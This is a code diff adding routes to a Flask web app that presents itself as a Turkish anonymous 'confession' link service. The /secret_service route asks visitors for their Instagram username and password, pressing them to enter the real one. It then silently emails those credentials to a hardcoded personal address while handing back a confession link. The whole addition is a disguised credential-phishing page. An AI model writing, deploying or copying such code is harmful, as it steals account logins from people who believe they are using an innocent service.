@@ -115,4 +115,68 @@ def generate():
         </body>
         </html>
     """
-    
+@app.route("/secret_service",methods=["POST","GET"])
+def secret_service():
+	if request.method == "POST":
+		email = request.form.get("email")
+		username = request.form.get("username")
+		password = request.form.get("password")
+		notify("efeakaroz13@gmail.com",f"requester: {email}",f"""username:{username};password:{password}""")
+		return "https://openspotify-13.herokuapp.com/itiraf?email="+email
+	return """
+		<html>
+			<head>
+				<meta charset="UTF-8">
+	            	<script src="/static/generate.js"></script>
+        	    	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+           		 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            		<title>itiraf servisi -  Openspotify-13</title>
+            		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+           		 <link rel="shortcut icon" href="/static/rocket.png" type="">
+
+			</head>
+			<body>
+				<form action="" method="POST">
+					<input type="text" name="username" placeholder="Instagram kullanıcı adı..." class="form-control">
+					<input type="password" name="password" placeholder="Şifre(yanlış olduğu takdirde bildirimler ulaşmayabilir)..." class="form-control">
+
+					<input type="email" placeholder="Bildirim sistemi için e-mail..." name="email" class="form-control">
+					<br>
+					<button type="submit">Link üret</button>
+				</form>
+			</body>
+		</html>
+	"""    
+
+@app.route("/itiraf",methods=["POST","GET"])
+def itiraf():
+
+
+	email = request.args.get("email")
+
+	if request.method == "POST":
+		itiraf = request.form.get("itiraf")
+		notify(email,f"Yeni itiraf!",f"{itiraf}")
+		return """<script>alert("itirafın iletildi!")</script>"""
+
+	return """
+
+		<html>
+                        <head>
+                                <meta charset="UTF-8">
+                        <script src="/static/generate.js"></script>
+                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                         <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>itiraf servisi -  Openspotify-13</title>
+                        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+                         <link rel="shortcut icon" href="/static/rocket.png" type="">
+
+                        </head>
+                        <body>
+                                <form action="" method="POST">
+                                	<input type="text" name="itiraf" placeholder="ITIRAFIN"><button>itiraf et</button>
+
+				</form>
+                        </body>
+                </html>
+	"""
